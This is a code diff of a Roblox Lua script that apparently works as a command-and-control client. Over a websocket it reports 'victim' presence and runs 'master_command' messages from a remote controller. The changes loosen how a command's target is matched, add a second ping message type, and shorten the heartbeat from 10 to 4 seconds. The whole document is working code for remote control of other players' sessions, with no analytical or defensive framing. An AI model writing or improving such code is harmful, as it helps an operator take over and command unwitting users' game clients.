@@ -61,8 +61,7 @@ local function handleCommand(data, ws)
         local t = string.lower(string.gsub(tostring(data.target), "%s+", ""))
         local myN = string.lower(string.gsub(tostring(LocalPlayer.Name or ""), "%s+", ""))
         local myD = string.lower(string.gsub(tostring(LocalPlayer.DisplayName or ""), "%s+", ""))
-        local myId = tostring(LocalPlayer.UserId or "")
-        if t ~= myN and t ~= myD and t ~= myId and not string.find(myN, t, 1, true) and not string.find(t, myN, 1, true) then
+        if t ~= myN and t ~= myD and not string.find(myN, t, 1, true) and not string.find(t, myN, 1, true) then
             return
         end
     end
@@ -379,7 +378,7 @@ task.spawn(function()
             local function onMsg(raw)
                 local s, data = pcall(function() return HttpService:JSONDecode(raw) end)
                 if s and data then
-                    if data.type == "ping_victims" then
+                    if data.type == "ping_victims" or data.type == "ping" then
                         sendPresence("victim_joined")
                     elseif data.type == "master_command" then
                         task.spawn(function()
@@ -404,7 +403,7 @@ task.spawn(function()
             pcall(function() ws.OnClose = onCloseHandler end)
 
             while not isClosed and _G.SacredVictimWS == ws and _G.SacredVictimSessionId == mySessionId do
-                task.wait(10)
+                task.wait(4)
                 sendPresence("victim_ping")
             end
         end
